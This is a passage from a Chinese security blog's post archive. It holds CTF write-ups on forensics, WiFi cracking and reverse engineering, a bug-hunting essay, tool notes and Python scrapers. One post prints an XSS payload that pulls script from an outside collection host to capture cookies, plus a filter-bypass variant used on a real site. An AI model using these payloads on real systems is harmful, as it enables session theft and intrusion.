soeasy\n```\nflag:HackingLabHdd1b7c2fb3ff3288bff\n\nHint:在这个文件中找到key就可以通关\n\nflag格式:key:\n\n题目来源：http://hackinglab.cn/ShowQues.php?type=pentest\n```\n**解法一：**\n1、下载文件后，发现是vmdk文件，利用DeskGenius打开后，发现Key，此为正确答案\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf12.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf13.png)\n\n**解法二：**\n1、利用Vmware映射虚拟硬盘同样可以打开\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf14.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf15.png)\n\n# 0x06 Crack\n```\nflag:19940808\n\nHint:flag就是密码\n\n题目：邻居悄悄把密码改了，你只知道邻居1994年出生的，能找到她的密码吗？\n\n题目来源：http://hackinglab.cn/ShowQues.php?type=decrypt\n```\n1、下载题目文件，根据题意，需要对WiFi密码破解，而且密码很有可能是邻居的生日，因此我们利用工具生成字典。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf16.png)\n2、接下来利用ewsa进行破解，可以看到破解后的密码\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf17.png)\n这道题目当时实验室有人用kali做的，kali下的工具感觉破解速度更快。\n\n# 0x07 BiliBili\n```\nflag:Congratulations_you_got_it\n\n题目：bilibili\n\nflag格式：ctf{}\n```\n**解法一：**\n1、使用Wireshark打开数据包，直接搜索ctf\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf18.png)\n2、找到标识的那一行右击进行追踪对应的协议，比如这条是http协议就追踪http协议，之后再次查找ctf\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf19.png)\n3、发现ctf括号后的内容为base64加密，解密即可得到flag\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf20.png)\n**解法二：**\n1、和解法一一样，对数据包进行追踪http流，不难看出这是访问space.bilibili.com/148389186的一个数据包\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf21.png)\n2、打开这个网址，同样可以看到被base64加密的flag\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf22.png)\n另外打个小广告，上面这个是我的bilibili号（TeamsSix），欢迎大家关注，嘿嘿\n\n# 0x08 Check\n```\nflag:sAdf_fDfkl_Fdf\n\n题目：简单的逆向\n\nflag格式：flag{}\n\n题目来源：https://www.cnblogs.com/QKSword/p/9095242.html\n```\n1、下载文件，发现是exe文件，放到PEiD里看看有没有壳以及是什么语言编写的，如果有壳需要先脱壳。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf23.png)\n2、可以看到使用的C语言写的，同时是32位，因此使用IDA32位打开，之后找到main函数\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf24.png)\n3、按F5查看伪代码，并点击sub_401050子函数\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf25.png)\n4、不难看出下列是一个10进制到ASCII码的转换\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf26.png)\n5、利用在线网站转换即可获得flag，网站地址：[http://ctf.ssleye.com/jinzhi.html](http://ctf.ssleye.com/jinzhi.html)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf27.png)\n\n# 0x09 Android RE\n```\nflag:DDCTF-397a90a3267641658bbc975326700f4b@didichuxing.com\n\n题目：安卓逆向\n\nflag格式：DDCTF-\n\nHint:flag中包含chuxing\n\n题目来源：https://xz.aliyun.com/t/1103\n```\n1、这道题是滴滴出行的一道CTF，下载题目可以看到一个apk文件，先在模拟器中运行看看是个什么东西\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf28.png)\n2、功能很简单，一个输入框，输错会提示Wrong，那么利用Android killer给它反编译一下，查找字符“Wrong”\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf29.png)\n3、可以看到Wrong字符的路径，接下来进行反编译，不过可能由于本身软件的文件，反编译提示未找到对应的APK源码，没关系，换ApkIDE对其进行编译\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf30.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf31.png)\n4、等待一段时间后，可以看到对应源码，简单分析就可以知道该代码从hello-libs.so文件加载，并且对mFlagEntryView.getText().toString()函数的内容即我们输入的内容和stringFromJNI()函数的内容做判断，如果一致就Correct，即正确，不一致就返回Wrong，即错误，那么接下来只需要分析stringFromJNI()的内容就行了，因此我们需要知道系统从hello-libs.so文件加载了什么\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf32.png)\n5、将APK解压，找到hello-libs.so文件，由于现在手机都是用arm64位的CPU（我也不知道是不是的啊，听别人说的），因此我们找到arm64-v8a文件夹下的libhello-libs.so文件，用IDA打开\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf33.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf34.png)\n6、打开IDA后，根据题目提示，Alt +T　查找chuxing\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf35.png)\n７、成功找到flag（DDCTF-397a90a3267641658bbc975326700f4b@didichuxing.com\n）输入到模拟器中看到提示Correct，说明flag正确。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf36.png)\n# 0x10 Easy_dump\n```\nflag：F0rens1cs_St2rt\n\n题目：Easy_dump\n\nflag格式：LCTF{}\n\nHint：volatilty了解一下\n\n题目来源：https://www.tr0y.wang/2016/12/16/MiniLCTF/index.html\n```\n**解法一：**\n1、下载题目文件，提示利用volatilty工具，同时结合文件后缀为vmem（VMWare的虚拟内存文件），因此判断是一个内存取证的题目，关于volatilty的使用可以参考官方手册：[https://github.com/volatilityfoundation/volatility/wiki/Command-Reference](https://github.com/volatilityfoundation/volatility/wiki/Command-Reference)，废话不多说，先看看镜像信息\n```bash\n# volatility -f xp.vmem imageinfo\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf37.png)\n2、可以看到该镜像信息的为WinXPSP2x86，接下来直接扫描查看一些系统文件中有没有flag文件\n```bash\n# volatility -f xp.vmem --profile=WinXPSP2x86 filescan | grep flag\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf38.png)\n3、将该flag.txt文件dump下来\n```bash\n# volatility -f xp.vmem --profile=WinXPSP2x86 dumpfiles -Q 0x0000000005ab74c8 -D ./ -u\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf39.png)\n4、直接cat flag文件即可看到flag\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf40.png)\n**解法二：**\n因为该题作者将flag复制到了自己电脑的粘贴板里的，所以直接获取粘贴板的内容也是可以看到flag的，不过谁能想到这种操作 [笑哭]\n```bash\n# volatility -f xp.vmem clipboard\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf41.png)\n\n以上就是本次我为他们准备的CTF的全部内容，大多数都是很基础的题目，平时拿来练练手还是不错的，拓宽一下自己的了解面，发现一些自己以前不知道的东西，如果你也想拿上面的题目来玩玩，在公众号（TeamsSix）回复CTF就可以获取下载地址哦。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png)","tags":["比赛","CTF","Writeup"],"categories":["CTF"]},{"title":"【经验总结】记录一次Docker下安装CTFd的错误","url":"/year/190720-121144.html","content":"# 0x01 提示错误\n根据官方的步骤执行docker-compose up但是我得到了这样的一个错误\n<!--more-->\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/docker_CTFd1.png)\n```bash\n~/CTFd# docker-compose up\nERROR: The Compose file './docker-compose.yml' is invalid because:\nnetworks.internal value Additional properties are not allowed ('internal' was unexpected)\n```\n经过多次查询后，是因为版本问题导致，因此需要将原来的docker-compose版本卸载，安装新版本。\n# 0x02 安装新版本\n卸载docker-compose版本\n```bash\npip uninstall docker-compose\n```\n先升级一下pip\n```bash\npip install –upgrade pip\n```\n继续安装新版本\n```bash\npip install -U docker-compose\n```\n也可以使用国内pip源进行加速，我使用的国内源进行的安装\n```bash\npip install -i https://pypi.tuna.tsinghua.edu.cn/simple -U docker-compose\n```\n之后再执行docker-compose up就没有问题了\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/docker_CTFd2.png)\n\n平时遇到问题还是需要先根据提示自己一步一步去找解决方法，之后再利用好Google。\n\n>参考文章：[https://www.ilanni.com/?p=13371](https://www.ilanni.com/?p=13371)\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png)","tags":["Docker","CTFd","环境搭建"],"categories":["经验总结"]},{"title":"分享一张超详细的渗透测试导图","url":"/year/190717-124041.html","content":"\n这是Github上看到的一张渗透测试思维导图，超级详细，在此分享。\n<!--more-->\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/渗透测试思维导图.png)\n> 图片来源地址：[https://github.com/iSafeBlue/Mind-Map](https://github.com/iSafeBlue/Mind-Map)\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png)","tags":["思维导图","渗透测试"],"categories":["资源分享"]},{"title":"【工具】批量网站CMS指纹识别","url":"/year/190715-102622.html","content":"# 0x01 概述\n* 使用Python3开发\n* 结果导出为Output_Result.csv文件\n* 使用在线平台（[http://whatweb.bugscaner.com](http://whatweb.bugscaner.com)）进行指纹识别\n* 项目下载地址：[Batch-identification-of-website-CMS-fingerprints](https://github.com/teamssix/Batch-identification-of-website-CMS-fingerprints)\n\n# 0x02 使用方法\n<!--more-->\n```bash\npip3 install -r requirements.txt\npython3 Batch_CMS_identification.py url.txt\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/Batch_CMS_identification1.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/Batch_CMS_identification2.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/Batch_CMS_identification3.png)\n# 0x03 注意事项\n* url.txt文件中地址格式需要http开头，如[http://www.teamssix.com](http://www.teamssix.com/)\n* 如果执行过程中出现警告，一般是碰到有些网站使用的https的情况，可以不用理会，对结果没有影响。\n* 如果想重新运行程序，请确认导出的CSV文件没有被打开，否则将因为不能导出文件而报错\n* 程序中途想要退出，可以直接Ctrl+C退出，等待一段时间后便会退出，结果会依然保存\n* 如果程序经常提示连接异常，可能因为对方拒绝连接或者本地网速较慢，如果本地网速延时较高，可将程序中的两处timeout调高一些，为保证速度，默认timeout为1秒。\n* 该平台每天有1500的使用限制。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png)","tags":["Python","批量工具","指纹识别"],"categories":["资源分享"]},{"title":"【经验总结】小白挖洞十天经验分享","url":"/year/190709-202131.html","content":"\n# 0x01 前言\n十天是指六月三十号到七月九号这十天的时间，这段时间正值暑假刚开始，虽然知道现在需要备战考研，但是看了几天书后却怎么也看不进去，这时刚好有个作业就是挖洞，于是再一次把考研的书扔到了一边。\n事先声明一下，因为是小白挖洞分享，所以难免会存在错误的地方，希望多多指正与包涵。\n其实自己早在一年前就有挖洞的想法，在那个时候虽然知道很多工具的使用方法，但是对于如何挖洞依旧一头雾水，慢慢的一年的时间就在自我否定与怀疑自己中过去了，因此今天分享的第一点就是要相信自己。\n<!--more-->\n# 0x02 相信自己\n这四个字，估计每个人都听过，但是如果没有这四个字，我估计我现在还在犹豫、怀疑自己、不敢去挖洞的环境中。毕竟一件事情如果还没有去做就开始否定自己，那结局注定是失败的，连开始的勇气都没有，又怎能谈何成功。\n所以如果你现在正处在想要开始挖洞却又不知道从哪里下手的情况时，那就先打开漏洞平台，补天、漏洞盒子什么的都行，注册个账号，接下来该干什么且听我一一道来。\n# 0x03 看清自己\n这四个字，是说要明白自己有几斤几两，也就是说要有自知之明，为什么这样说呢，因为你如果上来就挖专属SRC、企业SRC的话，估计会挖到怀疑人生，所以刚开始还是先从公益SRC入手，补天上上百个公益SRC，总能找到那么几个是存在漏洞的，注意，这里说总能找到那么几个，也就是说挖不挖得着看运气咯？\n事实上，我确实是这样的，挖不挖得到完全看运气，有时运气好了，一个站碰到很多漏洞，低危、中危、高危都齐了，有时候啥也挖不到，而这种看似运气不好的时候往往占据了很大比重，但在我看来，归根结底就两点原因：一是经验不足，二是过早放弃。\n经验不足没事儿，多挖就行，时间可以解决，过早放弃却不是那么容易解决的，下面我们就来好好唠唠这点。\n# 0x04 总结记录\n这四个字，很容易理解，那和刚才说的过早放弃又有什么关系呢？\n首先我们一起来想想为什么会过早的放弃，在我看来还是不相信自己，在这个时候你已经有勇气开始挖洞了，但是在挖洞的过程中碰到了困难，所以就想到了放弃。\n打开网页看到底部的360Logo，于是关闭网页，继续下一个公益SRC；在URL参数后面加引号回车一看，知道创宇为您保驾护航，于是关闭网页，继续下一个公益SRC；突然发现有个网站存在有漏洞的CMS，于是打开hackbar，Loadurl，加上Payload，Execute执行，一顿操作猛如虎，网站却提示你提交的数据包含非法字符，于是关闭网页，继续下一个公益SRC。\n其实这就是我刚开始几天的真实写照，慢慢的发现，这样可不行，太打击人了吧，于是开始有了 自己的总结，有了自己的挖洞思路。\n我自己写的总结就是记录整个挖洞过程，不管最后有没有挖到，都给记录下来，比如先看这个网站用的什么语言、操作系统、数据库版本，之后再看这个网站有没有用CMS，接着继续记录这个网站哪里可能存在漏洞，但自己没有复现出来，又或者这个网站的登陆页面是什么，自己注册了什么账号等等，反正只要稍微有些价值的信息都给记录下来，那记录这有什么用，只是为了记录吗？当然不是，首先一点就是过几天或者过段时间之后通过之前的记录你可能会找到当时没有复现出来的漏洞，还有另外一点在我看来也是很重要的一点，就是形成自己的挖洞思路。\n在我挖了几天之后，慢慢的心中就有了一个大概的挖洞步骤，之后便记录了下来，比如刚开始我一般利用Google Hacking去收集一些网站的登陆窗口什么的，刚开始就各种弱密码碰运气，期间还真碰到一个管理员弱密码的站，之后发现有些网站公告里会提到默认密码多少多少，于是继续Google Hacking搜索网站相关的公开默认密码，又或者找到存在发送短信的地方，看看有没有短信轰炸等逻辑漏洞，之后又去批量识别网站CMS，对存在低版本的网站进行Nday攻击等等，慢慢的自己就形成了一个挖洞思路，而且随着经验的不断丰富，这样的一份漏洞挖掘思路报告也会越来越详细，说到这里，不知道你有没有想到过早放弃和总结经验之间的联系。\n当你开始总结经验的时候，开始去记录开始去总结的那一刻，如果你碰到了问题，没关系，你可以看看自己总结的挖洞思路中还有没有记录其他的方法，如果真的已经没有思路了，那也没关系，把刚才渗透这个网站获取到的信息记录下来之后，开始下一个网站的漏洞挖掘。这时你应该发现，此时已经不存在什么过早放弃的概念了，因为当记录的那一刻起，以后如果有什么新的奇淫技巧依旧可以翻翻看看，挖到高危都是没准的事儿，最后就再说一点关于学习的事儿。\n# 0x05 终身学习\n这四个字，很重要，但熟悉我的人知道，我的成绩很一般，因为我不太喜欢学习，这里说的学习是指学习自己不感兴趣的东西，而对于我自己感兴趣的东西，那可真是太喜欢了。\n这是挖洞十天经验分享，以后或许会有挖洞十月经验分享，亦或者会有挖洞十年经验分享，不管技术怎么发展变化，保持一个终身学习的心态始终不至于和时代脱节，尤其在网安的圈子，终身学习更是至关重要。如果你的兴趣不在网安，我想本文同样适用于你，不论什么领域什么方向，首先要踏出第一步，其次看清自己几斤几两，最后在不断的失败中去总结成长。\n看到现在，相信你也发现刚才说的那么多更多的是经验分享，没有太多的挖洞技巧，毕竟人家还是个小白萌新，关于挖洞技巧在我的公众号（TeamsSix）会有分享，可以关注关注，如果本视频对你有帮助，欢迎点赞收藏一键三连，好了，汤家凤、朱伟他们还等着我呢，拜拜。\n\n本文视频：\n<div style=\"position: relative; width: 100%; height: 0; padding-bottom: 75%;\"><iframe src=\"//player.bilibili.com/player.html?aid=58541759&cid=102097106&page=1\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\" style=\"position: absolute; width: 100%; height: 100%; left: 0; top: 0;\"> </iframe></div>\n\n如果视频不能全屏播放，请点击[源链接](https://www.bilibili.com/video/av58541759/ \"源链接\")进行观看。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png)","tags":["经验总结","漏洞挖掘","小白"],"categories":["经验总结"]},{"title":"【渗透实例】记录一次XSS渗透过程","url":"/year/190703-221956.html","content":"\n# 0x01 找到存在XSS的位置\n没什么技巧，见到框就X，功夫不负有心人，在目标网站编辑收货地址处发现了存在XSS的地方，没想到这种大公司还会存在XSS。\n<!--more-->\n```\n使用的XSS代码：<img src=1 onerror=alert(1)>\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/xss1.png)\n# 0x02 构造XSS代码连接到XSS平台\nXSS平台给我们的XSS代码是这样的：\n```\n</tExtArEa>'\"><sCRiPt sRC=https://xss8.cc/3Ri4></sCrIpT>\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/xss2.png)\n直接插入的话会提示参数非法，经过多次尝试，最后发现该平台会对双引号、script字符进行识别过滤，大小写会被过滤，于是尝试插入下面的语句:\n```\n</tExtArEa>'\\\"><\\sCRiPt sRC=https://xss8.cc/3Ri4></\\sCrIpT>\n```\n这条代码比上面平台给的XSS代码的多了几个 \"\\\"，也就是转义字符，利用转义字符可以绕过该平台的策略，因为经验不足，所以在这一步尝试了很多种办法都没能绕过，要不有的可以插入但是连不上XSS平台，要不有的就是被识别拦截。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/xss3.png)\n加上转义字符成功插入后，刷新目标网站与XSS平台页面，在XSS平台就能看到刚才的访问记录。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/xss4.png)\n这里可以获取该登陆用户的Cookie、User-Agent、IP地址什么的，但是触发这个XSS需要登陆存在XSS的账号才行，所以个人觉着知道了这个Cookie也没啥用。\n并且虽然知道这里存在XSS，但是触发条件是需要知道用户名和密码，然后来到收货地址页面，所以个人感觉作用不大，因此在想这个漏洞还有没有其他的利用价值，后续或许会继续更新本次渗透过程，如果你有什么好的想法，欢迎下方留言。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png)","tags":["XSS","渗透实例"],"categories":["渗透实例"]},{"title":"【Python实例】让Python告诉你B站观影指南","url":"/year/190619-202702.html","content":"\n# 0x00 前言\nhello大家好，这里是TeamsSix，昨天晚上11点多的突然想在B站看电影了，但是又不知道那个电影值得看，于是首先想到的是去各大影评UP主的频道里面看看，转了几圈后发现他们讲解的电影B站很多都没有，这个时候又想到了一种方法，就是在B站搜索：“在B站值得看的电影”，没想到以前还真有UP主统计过：\n<!--more-->\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie1.png)\n点进去之后发现UP主居然手动统计了160多部电影，最后他做成了一个表格，看完了之后立刻给了三连，因为在我看来每一位付出了努力与汗水的UP主都值得被尊重（疯狂暗示），事后就想到能不能用我这三脚猫的Python水平统计一下B站最值得看的电影呢？\n有了想法，立刻从床上爬了起来，在夜黑风高的晚上开始垒起了代码，终于经历了一个通宵的时间之后完成了这个想法。\n# 0x01 代码运行\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie2.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie3.png)\n>具体代码见文章底部链接\n# 0x02 运行结果\n通过刚才的运行结果，可以看到，播放数量最高的是《你的名字》，足足有一千八百多万的播放量\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie4.png)\n弹幕数量最高的还是《你的名字》，有高达98万条弹幕\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie5.png)\n硬币数量最多的依然是《你的名字》，硬币数量达到了39万个\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie6.png)\n追剧人数最高的《命运之夜--天之杯：恶兆之花》\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie7.png)\nB站评分最高的不详，因为评分最高9.9的视频比较多，所以B站评分没有统计到视频最后的汇总里\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie8.png)\n在B站的电影中豆瓣评分最高的是《武林外传》，高达9.5分\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie9.png)\nB站评分与豆瓣评分差最大的是《深夜食堂》，两个平台差了7分，这部电影我也看过，表示还阔以，不明白为什么豆瓣评分那么低。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie10.png)\nok，最后我们再来总结一下，B站的电影中播放数量、弹幕数量、硬币数量最高的均为《你的名字》，可以说是B站电影区当之无愧的C位，其余《刀剑神域：序列之争》《声之形》《白蛇：缘起》也都经常出现在前三之中。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie11.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie12.png)\n\n# 0x03 结语\n在视频的最后再简单说两句，这些数据都是可以导出为表格的，另外在写代码的中间有个小插曲，就是在获取豆瓣搜索结果中电影评分的时候，发现电影数据都是被加密的，就像这个样子\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie13.png)\n最后通过SergioJune在Github上提供的代码得以解决，在这里也向他表示感谢\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie14.png)\n\n>文章代码：https://github.com/teamssix/bilibili-movie\n\n演示视频：\n<div style=\"position: relative; width: 100%; height: 0; padding-bottom: 75%;\"><iframe src=\"//player.bilibili.com/player.html?aid=56117996&cid=98086981&page=1\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\" style=\"position: absolute; width: 100%; height: 100%; left: 0; top: 0;\"> </iframe></div>\n\n如果视频不能全屏播放，请点击[源链接](https://www.bilibili.com/video/av56117996/ \"源链接\")观看。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png)","tags":["Python","电影","爬虫"],"categories":["Python 其他相关笔记"]},{"title":"【Python实例】让Python告诉你当前最火的电影是什么","url":"/year/190618-225704.html","content":"话不多说，先让我们看看最终效果图：\n<!--more-->\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm1.png)\n那么如何使用Python来获取这些信息呢？\n# 一、需求与思路\n# 1、需求\n首先要知道最近正在上映的电影的名称、评分、评论数等等，这些都可以在豆瓣上找得到，因此本次数据挖掘对象就确定为豆瓣电影官网。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm2.png)\n# 2、思路\na、调用requests模块向豆瓣电影官网发出请求\nb、调用BeautifulSoup模块从返回的html中提取数据\nc、调用pandas模块将提取的数据转为表格样式\n# 二、开工\n# 1、发出请求\n设置好headers,url，调用requests模块向目标网站发出请求，最后结果存储在res中\n```python\nimport requests\nheaders = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'}\nurl = 'https://movie.douban.com/cinema/nowplaying/beijing/'\nres = requests.get(url,headers = headers)\n```\n# 2、数据传入\n将html文本传入BeautifulSoup中，指定解析器为html.parser，并将解析内容传入soup\n```python\nfrom bs4 import BeautifulSoup\nsoup = BeautifulSoup(res.text,'html.parser')\n```\n# 三、数据提取\n在介绍数据提取之前需要先介绍一个插件：infolite，这款插件可以直接查看到控件路径，而不需要到复杂的开发人员工具中就行查看。\n# 1、电影名\n打开电影详情页面，找到电影名控件路径\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm3.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm4.png)\n最终修改为以下结果得到电影名称\n```python\ninsoup.select('h1')[0].text.split()[0]\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm5.png)\n# 2、豆瓣评分\n根据同样原理可得到该电影的评分\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm6.png)\n```python\ninsoup.select('.rating_num')[0].text\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm7.png)\n# 3、评论数量\n依旧是一样的思路，先利用InfoLite找到控件路径，再利用bs4模块提取对应内容。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm8.png)\n```python\ninsoup.select('.mod-hd a')[1].text.split()[1]\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm9.png)\n# 4、简介\n对于简介因为里面有很多空格换行等，所以这里使用了正则替换空格。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm10.png)\n```python\nre.sub('\\s','',insoup.select('.related-info span')[0].text)\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm11.png)\n这里写个函数，为实现传入一个URL，返回该URL中信息的功能，最终四项都将传入result字典中，所以接下来要做的就是如何获取URL。\n```python\ndef pages(url):\n    result = {}\n    inres = requests.get(url,headers = headers)\n    insoup = BeautifulSoup(inres.text,'html.parser')\n    \n    result['电影名'] = insoup.select('h1')[0].text.split()[0]\n    result['豆瓣评分'] = insoup.select('.rating_num')[0].text\n    result['评论数量'] = insoup.select('.mod-hd a')[1].text.split()[1]\n    result['简介'] = re.sub('\\s','',insoup.select('.related-info span')[0].text)\n    \n    return result\n```\n# 四、提取URL\n因为我们要找的电影是正在上映的电影，因此从正在上映的电影列表中提取URL即可。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm12.png)\n```python\nurl = 'https://movie.douban.com/cinema/nowplaying/beijing/'\nres = requests.get(url,headers = headers)\nsoup = BeautifulSoup(res.text,'html.parser')\n```\n在soup中含有这些链接，soup.select()是列表类型，有的列表项含有URL，有的不含有，并且在调试过程中发现有的含有链接的却没有评分信息。\n因此在以下语句中URL利用select存到urls中，利用判断语句来筛选掉一些没有评分的电影。\n```python\npools = []\nfor links in soup.select('ul'):\n    urls = links.select('a')[0]['href']\n    if len(links.select('.subject-rate')) > 0 :\n        pools.append(pages(urls))\n```\n最终，每个URL的信息都被添加到pools数组中，但是这个时候直接输出pools会很乱，因此接下来要做的就是生成表格。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm13.png)\n# 五、表格生成\n生成表格的方法也非常简单\n```python\nimport pandas\ndf = pandas.DataFrame(pools)\ndf\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm14.png)\n不过这样不够明显，因此我们可以将简介放到后面，再排序一下\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm15.png)\n# 六、总结\n上面一张图可以明显看到今天的四个贺岁电影中，《流浪星球》不管是豆瓣评分还是评论的数量都是第一个，倒也是实至名归。\n在整个过程中，碰到了很多问题，其中不乏有还未解决的问题，比如在提取电影标签的时候，因为正则使用的不熟而一直没有被很好的提取出来。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm16.png)\n在做这个数据挖掘之前，还做了新浪新闻的信息抓取，这个电影信息的数据挖掘也相当于是练练手，后面还有的导出文档、导出到数据库的功能就没有做演示了，也是几行代码的事情。\n用了一段时间Python后，真的不得不感叹到Python的强大之处，下面就把以上项目的全部代码展示出来吧，另外我还是个新手，代码写得十分笨拙，大佬还请绕步。\n```python\nimport re\nimport pandas\nimport requests\nfrom bs4 import BeautifulSoup\n\nheaders = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'}\nurl = 'https://movie.douban.com/cinema/nowplaying/beijing/'\nres = requests.get(url,headers = headers)\nsoup = BeautifulSoup(res.text,'html.parser')\npools = []\nfor links in soup.select('ul'):\n    urls = links.select('a')[0]['href']\n    if len(links.select('.subject-rate')) > 0 :\n        pools.append(pages(urls))\ndf = pandas.DataFrame(pools,columns = ['电影名','豆瓣评分','评论数量','简介'])\ndf.sort_values('豆瓣评分',inplace = True,ascending = False)\ndf\n\ndef pages(url):\n    result = {}\n    inres = requests.get(url,headers = headers)\n    insoup = BeautifulSoup(inres.text,'html.parser')\n    \n    result['电影名'] = insoup.select('h1')[0].text.split()[0]\n    result['豆瓣评分'] = insoup.select('.rating_num')[0].text\n    result['评论数量'] = insoup.select('.mod-hd a')[1].text.split()[1]\n    result['简介'] = re.sub('\\s','',insoup.select('.related-info span')[0].text)\n    \n    return result\n```\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png)","tags":["Python","电影","爬虫"],"categories":["Python 其他相关笔记"]},{"title":"【漏洞复现 CVE 2019-0708】17年的勒索病毒又双叕卷土重来了？","url":"/year/190615-013724.html","content":"# 0x00 